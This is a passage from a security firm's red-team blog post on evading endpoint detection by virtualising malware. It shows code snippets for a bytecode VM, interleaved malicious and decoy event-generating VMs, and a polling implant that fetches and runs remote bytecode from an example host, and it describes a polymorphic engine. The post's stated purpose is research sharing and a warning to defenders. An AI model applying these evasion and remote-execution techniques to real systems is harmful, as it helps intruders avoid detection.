|  | size\_t count; // The count of arguments present in the argument pack |
|  | uint8\_t arguments\[0\]; // The argument data |
|  | }; |
|  |  |
|  | boolhas\_argument(Arguments\* args, size\_t tag); |
|  | Argument\* get\_argument\_by\_tag(Arguments\* args, size\_t tag); |
|  | voiddecrypt\_argument(Argument\* arg); |
|  | voidencrypt\_argument(Argument\* arg); |
|  |  |
|  | // utility functions to interpret the argument's payload |
|  | boolget\_argument\_boolean(Argument\* arg); |
|  | int64\_tget\_argument\_integer(Argument\* arg); |
|  | char\\* get\_argument\_string(Argument\* arg); |
|  | void\\* get\_argument\_data(Argument\* arg, size\_t\\* size); |

[view raw](https://gist.github.com/fox-srt/ab0928dbd0f37dda1fd977fb5621dd1a/raw/81bd9550b2cf2226d885d06980e376ef952d28e2/api.cpp) [api.cpp](https://gist.github.com/fox-srt/ab0928dbd0f37dda1fd977fb5621dd1a#file-api-cpp)
hosted with ❤ by [GitHub](https://github.com/)

The signature of the bytecode’s entry point is updated to incorporate this change:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | int bytecode\_main(Arguments\* args); |

[view raw](https://gist.github.com/fox-srt/5eb524a8e057a7dfbe63603904038a77/raw/27602331f09f56b0510fbc58d24fe308977b5ce7/bytecode_args.cpp) [bytecode\_args.cpp](https://gist.github.com/fox-srt/5eb524a8e057a7dfbe63603904038a77#file-bytecode_args-cpp)
hosted with ❤ by [GitHub](https://github.com/)

## **Supporting DLLs**

Executables and DLLs are very similar in the way they look and in the way they execute. Both have an entry point to which execution is passed, and both return a value. However, the execution flow of an executable starts at the entry point, and does not reach its function’s end until the program stops. DLLs often perform very limited initialization within their entry point, and return execution to the loader to not lock the loader threads. Additionally, the entry point of the DLL is called more than once: on process startup and shutdown, and on thread creation and destruction. The reason for calling the entry point is passed by the loader in the second, `dwReason`, argument. This allows the code inside of the `DllMain` function to differentiate between the reasons the entry point was invoked, and can act accordingly.

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved); |

[view raw](https://gist.github.com/fox-srt/a4ffb0e69a3950845021c53041c3d627/raw/663b4a869278154570e94d5bdce41ecfb7a7b0a3/dllmain.h) [dllmain.h](https://gist.github.com/fox-srt/a4ffb0e69a3950845021c53041c3d627#file-dllmain-h)
hosted with ❤ by [GitHub](https://github.com/)

To allow our shellcode to be embedded within DLLs, both the virtual machine and its bytecode must be made aware of the reason for invocation. This requires the entry point of the virtual machine and bytecode to match that of a DLL, automatically receiving the reason by the OS loader. This does not interfere with the entry point used by a normal executable, as the default entry point of any executable does not take any arguments directly, but instead the arguments `argc` and `argv` are resolved by the C runtime, which is not linked against.

On initialization, the virtual machine sets the bytecode’s `rdx` register to the value of its reason argument, passing the value to the entry point as the second argument. The programmer must decide if this value is to be inspected within the bytecode and should not use the value when writing bytecode to be embedded in an executable.

## **Deceiving Behavioral Analysis: Multi-VM Execution**

Earlier, the method of detection based on behavior was discussed. This dynamic form of inspecting an application’s execution flow regardless of static patens is difficult for attackers to rid their malware of. Opening `Lsass.exe` and reading its memory could be marked as malicious, even if the process looks like `calc.exe`. Often, defensive products receive events by kernel callbacks, such as `PsSetCreateProcessNotifyRoutine`[19](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c8fe9216-5079-4cf0-8cfe-7e8c5edd3e6f) or `PsSetLoadImageNotifyRoutine`[20](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#77d6f08a-3550-47cd-bb5d-28f618ff8a4e), API/syscall hooks in the local process or by using Event Tracing for Windows (ETW)[21](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#4ccf8e4c-c5db-4e01-a123-6be2ecc6bdc8) consumers.

Patching hooks in the local process along with local ETW functions that provide events is trivial. This rids the process of intrusive monitoring by antivirus or EDR solutions, and stops the process from creating events. However, some events are still generated, mostly by the ETW providers present in the kernel, along with the kernel callbacks. Additionally, events created during patching could still be monitored. Lastly, blinding defensive products could have a negative effect, as failure to receiving check-ins could be considered an error and a signal of malicious behavior by itself.

As an attacker, generating arbitrary events along with ones that might cause detection could be a method of thwarting dynamic detection rules based on behavior. Adding code to generate events in between regular instructions would require manipulation of source code, and is not preferred. Creating a new thread that generates random events could be in vain, as events are registered per unique thread in the process.

The virtual machine was extended to support `vmcalls`. These types of `call` instructions made by the bytecode notify the virtual machine layer that a task needs to be performed. Among multiple different supported calls, most noteworthy are the following:

- `vminit`: Initialize the virtual machine object with bytecode and arguments
- `vmexec`: Execute N cycles on the virtual machine

The combination of these two calls allows bytecode to create a new virtual machine, and execute a predetermined number of instructions:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | #define NUM\_CYCLES 200 |
|  |  |
|  | // load the malicious bytecode and create a vm object |
|  | auto malicious = load\_malicious\_instructions(); |
|  | auto malicious\_vm = allocate\_vm\_object(); |
|  |  |
|  | // load the bytecode creating events |
|  | auto events = load\_event\_bytecode(); |
|  | auto events\_vm = allocate\_vm\_object(); |
|  |  |
|  | // initialize the vm objects with their bytecode and no arguments |
|  | vmcall<vminit>::call(malicious\_vm, malicious, nullptr); |
|  | vmcall<vminit>::call(events\_vm, events, nullptr); |
|  |  |
|  | while (true) { |
|  | vmcall<vmexec>::call(malicious\_vm, NUM\_CYCLES); |
|  | vmcall<vmexec>::call(events\_vm, NUM\_CYCLES); |
|  | } |

[view raw](https://gist.github.com/fox-srt/6060d146331322b0c8dc4c9a168c2132/raw/8dfb71f1d6fe915fc5259e2e17cf72d9fec04781/vm_call.cpp) [vm\_call.cpp](https://gist.github.com/fox-srt/6060d146331322b0c8dc4c9a168c2132#file-vm_call-cpp)
hosted with ❤ by [GitHub](https://github.com/)

Because both sets of bytecode execute within the same virtual machine, and therefore on the same thread, no distinction can be made between the origin of each event. The OS, and any event consumers will observe a single thread generating multiple events, both benign and possibly malicious. Most importantly for an attacker, this could break patterns of behavior being monitored for.

As an additional benefit of these added instructions, bytecode can now be obtained and executed at runtime. This proved to be an extremely useful feature during payload development, as instead of staging shellcode during Command and Control, bytecode can be provided. This removes the necessity for allocating executable memory regions (or changing memory protection at a later stage) to execute shellcode in, in turn removing the opportunity for defensive products to inspect buffers used for dynamic code execution often leveraged by attackers.

For example, the following behavior could be implemented to create a simple polling implant, requesting bytecode every 10 seconds:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | // allocate the virtual machine object |
|  | auto vm = allocate\_vm\_object(); |
|  |  |
|  | while (true) { |
|  | // attempt to obtain bytecode from server |
|  | void\* bytecode = http\_get(" [https://example.com/bytecode&quot](https://example.com/bytecode&quot);); |
|  |  |
|  | // check if we received bytecode |
|  | if (bytecode) { |
|  | // initialize the vm object with our bytecode and execute it in its entirety |
|  | vmcall<vminit>::call(vm, bytecode, nullptr); |
|  | vmcall<vmexec>::call(vm, RUN\_UNTIL\_END); |
|  | } |
|  |  |
|  | // free the bytecode buffer and sleep for 10 seconds |
|  | free(bytecode); |
|  | sleep(10'000); |
|  | } |

[view raw](https://gist.github.com/fox-srt/bef508eb5c2ffa0edb74316e9cf9fec0/raw/0ea73dda83c0cebf5796978edc9bd3687263c3da/polling_bytecode.cpp) [polling\_bytecode.cpp](https://gist.github.com/fox-srt/bef508eb5c2ffa0edb74316e9cf9fec0#file-polling_bytecode-cpp)
hosted with ❤ by [GitHub](https://github.com/)

## **Protecting the Virtual Machine**

At this point, we have defeated most detection measures that we are aware of, and set out to defeat. However, the VM shares a fundamental weakness with the original packers: static patterns in the native-code VM. Throughout its development, the VM was kept as simple as possible, adhering to constraints set out to enable support for a polymorphic engine to be executed on the VM’s binary code. This made the development significantly more cumbersome, but, given a sufficiently strong polymorphic engine, does close the detection loop fully. The polymorphic engine we developed has been battle tested over several years of use against modern EDR, and antimalware. Despite the fact that the code of the engine was designed years ago, and has not significantly changed since, it still manages to mutate malicious code to the extent that it becomes undetected at runtime and scan time.

Due to the way the universe works, the engine cannot support arbitrary programs. The largest constraint is that dynamic control flow is not supported. This means that indirect function calls, indirect jumps and the `ret` instruction could all potentially break the mutated code. Our engine assumes you know what you’re doing, and won’t complain when such instructions are encountered, but the resulting code will likely not work as intended.

The polymorphic engine supports several different mutation techniques, including:

- Instruction substitution: replacing instructions with semantically equivalent ones. For example: `mov eax, 0` can be replaced with `xor eax, eax`;
- Basic block reordering: changing the order of basic blocks in the code;
- Basic block creation: inserting new basic blocks into the code, through jumps and push rets;
- NOP instruction insertion: inserting NOP instructions to change the code’s layout.

The most important feature is that the output of the engine can be fed back into the engine again. This allows for multiple iterations of mutation, which leads to virtually incomprehensible disassembly. This is especially useful when the input is a small piece of code, like a shellcode loader. Sufficient numbers of mutation will double, or quadruple the size of the output, further muddying the waters for defenders.

## **Conclusion**

Due to the ever-changing security landscape, both attackers and defenders must stay on their toes. Defensive security products continue to improve over time, making it more difficult for attackers to remain undetected, or even execute malicious code at all. Detection of payloads has shifted from static analysis to a combination of heuristics and signatures, rendering some tools obsolete.

In this blog post, we have described a tool that was written to tackle both static and dynamic analysis by way of virtualisation. This technique, along with employing a custom polymorphic engine attempts to evade these types of analysis by layers of obfuscation. To bypass heuristic analysis, support for multiple virtual machines to run concurrently was added, disrupting patterns in created events. As an added bonus, reverse engineering a sample without prior knowledge could be a daunting task. Analysts would have to reverse not only the morphed virtual machine itself, but extract morphed bytecode for further analysis. This does not remediate the issue of reverse engineering payloads for an attacker, but does significantly slow down the process, providing the attacker with more time.

In practice, this project has allowed attacks to remain undetected during Red Teaming and TIBER exercises in some of the most heavily monitored environments, making use of state of the art EDR solutions. Moreover, due to the addition of a transpiler converting compiled binaries into custom bytecode, both the speed and ease of development of custom payloads was greatly improved.

The following is a non-exhaustive list of payloads that were created during a recent Red Teaming exercise, successfully evading detection:

- Multiple persistence modules;
- Multiple lateral movement modules;
- Shellcode and bytecode executor;
- Antivirus and EDR patchers;
- HTTP(s) and DNS beacons;
- Tools querying Active Directory information.

Porting of additional tools is taking place, and we expect to have virtualized versions of most tools used in a Red Team exercise in the near future.

## **Looking Forward**

The motivations for this blog post are two-fold. Firstly, we wanted to share what we think is exciting research with the community. We learned what we did from openly shared blog post and articles, and want to give back to the community. We use all the knowledge we gained to improve the security of our customers through offensive security testing, and we hope that this blog post will help and inspire others to do the same.

Secondly, although security products have advanced tremendously, we want to show that there is still room for improvement. We have noticed a tendency to “slap an EDR on it and call it a day” in certain niches of the security industry. Although that might work for some time, because a modern EDR truly adds a strong layer of security, the door is still open for attackers to bypass these products. As the landscape evolves, and general cyber security knowledge increases, the skill and sophistication of cyber criminal elements will rise. Consider this blog post, and the technique explained within, as a warning and a call to action. We hope security vendors will think about how they can detect these types of payloads, and how they can improve their products to stay ahead of the curve, as they are right now.

## References

01. [https://www.openwall.com/lists/oss-security/2024/03/29/4](https://www.openwall.com/lists/oss-security/2024/03/29/4) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#7585f960-0f16-4135-a8ca-4c1a7afaf522-link)
02. [https://en.wikipedia.org/wiki/Polymorphic\_engine](https://en.wikipedia.org/wiki/Polymorphic_engine) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#44855f57-fd3e-421c-982e-d36328596170-link)
03. [https://en.wikipedia.org/wiki/Executable-space\_protection](https://en.wikipedia.org/wiki/Executable-space_protection) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#52fb0fbc-3a9b-4589-8e2d-9d1e8d0c061c-link)
04. [https://en.wikipedia.org/wiki/Metamorphic\_code](https://en.wikipedia.org/wiki/Metamorphic_code) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#cfd6c36c-6510-4789-b2d1-c0e4563fe349-link)
05. [https://vmpsoft.com/](https://vmpsoft.com/) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#acb3be7f-0d0e-469f-9341-965d785683ff-link)
06. [https://en.wikipedia.org/wiki/Opcode](https://en.wikipedia.org/wiki/Opcode) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#2ebbe913-5b00-48a1-b7b0-e23287e60c0b-link)
07. [https://en.wikipedia.org/wiki/Bytecode](https://en.wikipedia.org/wiki/Bytecode) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c7153637-5f3e-4f28-bf6c-424c707b29e3-link)
08. [https://en.wikipedia.org/wiki/Disassembler#Length\_disassembler](https://en.wikipedia.org/wiki/Disassembler#Length_disassembler) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#1960560c-70db-407a-a395-9e1603895b60-link)
09. [https://en.wikipedia.org/wiki/Streaming\_SIMD\_Extensions](https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#389cbcc6-797d-4476-9eba-0e3e964d20ff-link)
10. [https://en.wikipedia.org/wiki/Advanced\_Vector\_Extensions](https://en.wikipedia.org/wiki/Advanced_Vector_Extensions) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#745fab9c-8318-41e7-8c04-e5e6ed908584-link)
11. [https://www.felixcloutier.com/x86/bt](https://www.felixcloutier.com/x86/bt) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#3e7aeb95-4e7c-44d8-8927-61a261e8050f-link)
12. [https://github.com/icedland/iced](https://github.com/icedland/iced) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#ad0bb794-316c-4597-88f6-ecbc4030e79c-link)
13. [https://en.wikipedia.org/wiki/Position-independent\_code](https://en.wikipedia.org/wiki/Position-independent_code) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#54e90f32-844d-4c9a-b618-0c30b0f819ea-link)
14. [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files\_main.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#21563ac9-99ea-4aca-a16e-513b183fc1ad-link)
15. [https://learn.microsoft.com/en-us/cpp/cpp/stdcall](https://learn.microsoft.com/en-us/cpp/cpp/stdcall) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c9c503f8-ef6a-4456-a99d-d3dbe23b07ca-link)
16. [https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735](https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#beb24e60-5081-4d4d-9893-171865561078-link)
17. [https://www.felixcloutier.com/x86/lea](https://www.felixcloutier.com/x86/lea) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#92454169-a059-4c6e-bbcb-b92f8bac754c-link)
18. [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics\_aggressor-scripts/as-resources\_functions.htm#bof\_pack](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bof_pack) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#b4e4ab6a-3024-4673-b724-fea7bedd7042-link)
19. [https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c8fe9216-5079-4cf0-8cfe-7e8c5edd3e6f-link)
20. [https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#77d6f08a-3550-47cd-bb5d-28f618ff8a4e-link)
21. [https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows–etw-](https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#4ccf8e4c-c5db-4e01-a123-6be2ecc6bdc8-link)

### Share this:

- [Email a link to a friend (Opens in new window)Email](mailto:?subject=%5BShared%20Post%5D%20Red%20Teaming%20in%20the%20age%20of%20EDR%3A%20Evasion%20of%20Endpoint%20Detection%20Through%20Malware%20Virtualisation&body=https%3A%2F%2Fblog.fox-it.com%2F2024%2F09%2F25%2Fred-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation%2F&share=email&nb=1)
- [Share on Facebook (Opens in new window)Facebook](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/?share=facebook&nb=1)
- [Share on LinkedIn (Opens in new window)LinkedIn](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/?share=linkedin&nb=1)
- [Share on X (Opens in new window)X](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/?share=twitter&nb=1)
- [Share on Pocket (Opens in new window)Pocket](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/?share=pocket&nb=1)

### Like this:

LikeLoading...

**Published** September 25, 2024

[Toggle photo metadata visibility](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#)[Toggle photo comments visibility](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#)

Loading Comments...

Write a Comment...

EmailNameWebsite

%d